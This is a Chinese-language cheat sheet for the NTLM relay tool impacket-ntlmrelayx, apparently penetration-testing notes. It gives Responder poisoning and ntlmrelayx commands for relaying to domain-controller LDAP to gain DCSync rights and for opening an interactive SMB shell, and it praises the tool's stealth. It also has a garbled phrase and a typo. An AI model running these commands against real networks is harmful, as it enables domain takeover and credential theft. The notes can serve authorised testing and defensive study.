# impacket-ntlmrelayx

## 介绍

impacket-ntlmrelayx是NTLM中继攻击（NTLM Relay Attack）工具，它可以拦截客户端的NTLM认证请求，并将这些认证“中继”到其他目标服务（如SMB、LDAP、HTTP、MSSQL等），实现凭据窃取、权限提升、甚至域管。

## 核心功能

（1）NTLM中继：捕捉NTLM挑战/响应，将其转发到目标服务进行认证。（无需破解哈希）

（2）多协议支持：中继到SMB（文件访问）、LDAP（修改用户属性、RBCD资源委派约束）、HTTP(WebDAV)、MSSQL等

（3）交互模式：实时交互shell（中继到SMB时可执行命令）

（4）自动攻击：结合Responder.py毒化LLMNR/NBNS/mDNS，诱导机器认证

（5）OPSEC优秀：不落地文件，日志少（比PTH更隐蔽）

## 参数

| 参数           | 说明                              | 示例值                      | 场景            |
| -------------- | --------------------------------- | --------------------------- | --------------- |
| -t / --targets | 中继目标（支持文件列表）          | ldap://DC_IP 或 targets.txt | 中继到域控LDAP  |
| -smb2support   | 启用SMB2/SMB3支持                 | 无值（开关）                | 现代Windows必加 |
| -i             | 交互模式（中继到SMB时开启nc监听） | 无值                        | 获取交互shell   |
| -wh            | WPAD代理认证攻击                  | 无值                        | Web代理中继     |
| -l             | 本地loot目录（保存dump的哈希）    | loot                        | 自动保存SAM哈希 |
| -tf            | 目标文件（一行一个目标）          | targets.txt                 | 批量中继        |
| --http-port    | http服务器端口                    | 80                          | http中继        |
| -6             | IPv6支持                          | 无值                        | IPv6环境        |



## 场景

1）SMB到LDAP中继（域管接管）：

​	（1）拦截机器账户NTLM认证，中继到域控LDAP，修改用户属性（添加DCSync权限或者RBCD）

​	（2）示例：给低权限用户台南佳“Replicating Get Changes All”权限->DCSync dump 域哈希

2）SMB到SMB中继：获取目标机器文件访问权（读系统文件、上传webshell）

3）HTTP到LDAP：中继WebClient服务认证（Printer Bug 利用）

## SMB到LDAP中继（权限提升）

```
#先用Responder毒化（另一个终端）
responder -I eth0 -dw
#ntlmrelayx 中继到域控LDAP，自动添加DCSync权限
impacket-ntlmrelayx -t ldap://DC_IP -smb2support --add-computer newpc --delegate-access
#或交互模式拿shell
impacket-ntlmrelayx -t smb://target_IP -smb2support -i
然后nc 127.0.0.1 11000 连接交互shell
```

## 结合Printer Bug （SpoolSample）

（1）诱导域控向你的机器认证NTLM（用SpoolSample触发），ntlmrelayx捕获后中继到LDAP接管域。

## 注意

（1）防护绕过：需目标禁用SMB/LDAP签名（Signing Disabled，默认旧系统开启，新系统强制）

（2）常见坑：机器账户认证需要Responder毒化；域控默认不中继（Protected User 组保护）

（3）报告：利用NTLM Realy攻击中继机器账户认证到LDAP，实现DCSync权限提升

（4）备选：如果ntlmrelayx失败，结合PetitPotam或PrinterNotify强认证。

